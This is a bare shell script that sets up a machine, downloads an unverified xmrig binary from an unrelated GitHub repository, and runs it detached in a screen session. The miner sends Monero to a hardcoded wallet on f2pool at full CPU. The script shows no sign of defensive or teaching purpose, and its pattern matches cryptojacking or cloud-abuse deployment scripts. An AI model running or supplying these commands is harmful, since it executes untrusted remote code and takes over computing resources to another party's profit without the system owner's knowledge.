wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
rpm -ivh epel-release-latest-7.noarch.rpm

yum install -y wget screen git unzip gcc htop

wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/opsengine/cpulimit/archive/master.zip -O cpulimit.zip
unzip cpulimit.zip
cd cpulimit-master
make
cp src/cpulimit /usr/bin
cd ~
rm -rf cpulimit-master
rm -f cpulimit.zip

wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/andreevnodar89/ZTSZTS/raw/master/xmrig -O xmrig
chmod +x ./xmrig

screen -dmSL MM bash -c "./xmrig -o xmr.f2pool.com:13531 -u 48nQPrR5Gk7XNDrYr7Q922U4qSEmJGdwjjays4Ufb2A38Lxz2B8HCMAQMazcyUxiGCgmz2q3jfMNXUjFULv1W3Pn3FDYcAr.Namseong -p x --donate-level=0 --threads=4 --randomx-init=4 --max-cpu-usage=100 --randomx-1gb-pages --randomx-1gb-pages --keepalive --cpu-priority=0"